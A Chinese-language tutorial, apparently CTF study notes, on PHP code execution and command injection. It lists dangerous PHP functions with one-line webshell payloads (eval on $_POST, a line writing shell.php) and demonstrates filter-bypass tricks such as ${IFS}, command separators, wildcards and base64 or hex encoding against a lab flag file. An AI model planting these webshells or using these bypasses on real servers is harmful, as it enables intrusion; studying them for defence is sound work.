# 命令注入


## 前言
首先需要注意：命令注入（command Injection）和远程代码执行RCE（remote command/code execute）是不同的。远程代码执行是调用服务器使用的后端代码（如PHP PYTHON JAVA）进行执行，而命令注入则是调用系统(linux windows)命令进行执行。
<br/>

## 代码执行

常见的PHP代码命令函数： 
- assert
- eval
- preg_replace
- call_user_func
- call_user_func_array
- array_map
- ...
<br/>



### eval函数
`eval ( string $code ) : mixed`
eval() 函数把字符串按照 PHP 代码来执行，该字符串必须是合法的 PHP 代码，且必须以分号结尾。
```php
<?php
eval(phpinfo());
?>
```
常见的一句话木马也是采用`eval`函数
```php
<?php eval($_POST["cmd"]);?> 
```
写shell
```php
fputs(fopen('shell.php','w+'),'<?php @eval($_POST[cmd])?>');
```
<br/>


### assert函数
`assert ( mixed $assertion [, Throwable $exception ] ) : bool`
assert检查一个断言是否为 FALSE，如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。
```php
<?php assert(phpinfo()); ?>
```
注意：在PHP7中assert变成了一种语言结构而不是一个函数，不在支持可变函数，意味着不再支持`?a=assert&b=phpinfo()`
```php
<?php  
//php5可以正常运行，php7无法使用
$a=$_GET['a']; //assert
$b=$_GET['b']; //phpinfo()
$a($b);
?>
```
<br/>

### preg_replace函数
`preg_replace(mixed $pattern，mixed $replacement，mixed $subject[，int $limit = -1 [,int &$count]]):mixed`
preg_replace执行一个正则表达式的搜索和替换，当$pattern为/e，会把replacement参数当成PHP代码执行
```php
<?php
preg_replace("/test/e","phpinfo();","test");
?>
```
注： PHP 5.5.0 起， 传入 "\e" 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 "\e" 也无法起效。 
<br/>

### create_function函数
`string create_function ( string $args， string $code )`
创建一个匿名函数，create_function函数会在内部执行eval()
```php
<?php
$newfunc = create_function('$a,$b', 'return "$a + $b = " . ($a + $b);');
echo $newfunc(1,2) . "\n"; // 1+2=3
?>
```

等价于

```php
<?php 
function lambda($a,$b){ 
	return "$a+$b = ".($a+$b); 
}
echo lambda(1,2); 
?>
```

可以利用该函数构造webshell，`?cmd=phpinfo();`
```php
<?php $func =create_function('',$_GET['cmd']);$func();?> 
```
注：从PHP 7.2.0开始，create_function()被废弃
<br/>

### call_user_func函数
` call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed`
call_user_func 第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。 
```php
<?php
    $callback= 'system';
    $parameter = 'ls';
    call_user_func($callback, $parameter); //system("ls")
?>
```
利用方式：`?cmd=phpinfo()`
```php
<?php call_user_func(assert,$_GET['cmd']); ?>
```
<br/>

### call_user_func_array函数
`call_user_func_array ( callable $callback , array $param_arr ) : mixed`
 把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。 
```php
<?php
call_user_func_array('assert', array('phpinfo()'));
?>
```
利用方式 `?cmd=phpinfo()`
```php
<?php 
$array=array($_GET['cmd']);
call_user_func_array("assert",$array);  
?>
```
<br/>

### array_map函数
` array_map ( callable $callback , array $array1 [, array $... ] ) : array`
 array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数`形参的数量和传给 array_map() 数组数量，两者必须一样。 
```php
<?php
    $array = array("dir","ping www.baidu.com");
    array_map($_GET["cmd"],$array);// ?cmd=system
?>
```
利用方法： `?a=assert&b=phpinfo();`
```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
$array = array($b);
$c = array_map($a,$array);
?>
```
<br/>

## 命令注入
常见的PHP命令注入
- system
- exec
- shell_exec
- passthru
- proc_open
- popen()
- ...
<br/>

### system函数
` system ( string $command [, int &$return_var ] ) : string`
最常见的命令执行函数system，可以调用当前系统的命令，并且输出执行结果
```php
<?php system("ls"); ?>
```
<br/>

### exec函数
`exec ( string $command [, array &$output [, int &$return_var ]] ) : string`
 exec() 执行 command 参数所指定的命令。
```php
<?php echo exec("whoami"); ?>
```
<br/>

### shell_exec函数
` shell_exec ( string $cmd ) : string`
通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回（当 PHP 运行在 安全模式 时，不能使用此函数。 ）
```php
<?php echo shell_exec('whoami'); ?>
```
注：反引号 \` \` 实际上就是调用该函数
<br/>

### passthru函数
` passthru ( string $command [, int &$return_var ] ) : void`
执行外部程序并且显示原始输出
```php
<?php passthru("whoami") ?>
```
<br/>

## 绕过姿势
### 空格绕过
在ban掉空格的情况下，可以使用字符进行替换
- `<` 重定向
- `$IFS$9`  $9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串
- `${IFS}`
- `%09`
<br/>

```PHP
root@gnq:~# cat<flag.txt 
flag{2333333_test_file}

root@gnq:~# cat${IFS}$1flag.txt
flag{2333333_test_file}

root@gnq:~# cat${IFS}$9flag.txt
flag{2333333_test_file}

root@gnq:~# cat${IFS}flag.txt
flag{2333333_test_file}
```
%09绕过
![](09.png)

<br/>

### 符号绕过
- `&&` 只有前面的命令执行成功，才执行拼接后面的命令
- `||` 只有前面的命令执行失败，才执行拼接后面的命令
- `|`  管道符，将左边输出的内容作为右边的命令的输入，所以左边的内容并不输出
- `&`  将此进程设置为后台进程
- `;`  分号为Linux中的命令分隔符
- `{}` 绕过
- `%0a` 换行符
<br/>

```php
root@gnq:~# whoami && cat flag.txt
root
flag{2333333_test_file}

root@gnq:~# test  ||  cat flag.txt
flag{2333333_test_file}

root@gnq:~# echo "hello" |  cat flag.txt
flag{2333333_test_file}

root@gnq:~# pwd &  cat flag.txt
[1] 9652
/root
flag{2333333_test_file}
[1]+  Done                    pwd

root@gnq:~# pwd;cat flag.txt
/root
flag{2333333_test_file}

root@gnq:~# {cat,flag.txt}
flag{2333333_test_file}

```
<br/>

### 通配符绕过

- `*` 代表0到无穷个任意字符 
- `?` 一个任意字符
- `[ - ]` 表示在这个区间的任意字符，如[a-z]表示a到z的26个字符
- `[^]` 表示取反，如[^a]表示非a字符

<br/>

```php
root@gnq:~# cat fl*g.txt
flag{2333333_test_file}

root@gnq:~# cat fl?g.txt
flag{2333333_test_file}

root@gnq:~# cat fl[a,b,c,d]g.txt
flag{2333333_test_file}

root@gnq:~# cat fl[a-z]g.txt
flag{2333333_test_file}

root@gnq:~# cat fl[^b]g.txt
flag{2333333_test_file}
```
<br/>

### 关键字绕过
- 变量绕过
- 编码绕过
- 反斜杠
- 拼接符
- 历史命令绕过
- `$*`、`$@`、`$x`（x表示1-9）、`${x}`（x为任意字母或数字）,在没有传参的情况下，这些特殊变量都是为空

<br/>

```php
//变量绕过
root@gnq:~# a=l;b=s;$a$b
Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos  vmware-tools-distrib

//base64绕过
root@gnq:~# ` echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d` 
flag{2333333_test_file}

//十六进制绕过
root@gnq:~# `echo 63617420666c61672e7478740a | xxd -r -p`
flag{2333333_test_file}

//反斜杠
root@gnq:~# ca\t \f\l\a\g.\t\x\t
flag{2333333_test_file}

//拼接符
root@gnq:~# cat "f"lag."t"x"t"
flag{2333333_test_file}

//特殊变量
root@gnq:~# ca$*t flag.txt
flag{2333333_test_file}

root@gnq:~# ca$@t flag.txt
flag{2333333_test_file}

root@gnq:~# ca$2t flag.txt
flag{2333333_test_file}


```
利用历史命令绕过
```php
root@gnq:~# ca
root@gnq:~# t
root@gnq:~# fla
root@gnq:~# g.txt

root@gnq:~# history 
    1  ca
    2  t
    3  fla
    4  g.txt
    5  history 
root@gnq:~# !1!2 !3!4
cat flag.txt
flag{2333333_test_file}
```
<br/>




## 参考

参考内容（侵删）：
[CTF命令执行及绕过技巧](https://blog.csdn.net/JBlock/article/details/88311388)
[Bypass一些命令注入限制的姿势](https://xz.aliyun.com/t/3918)

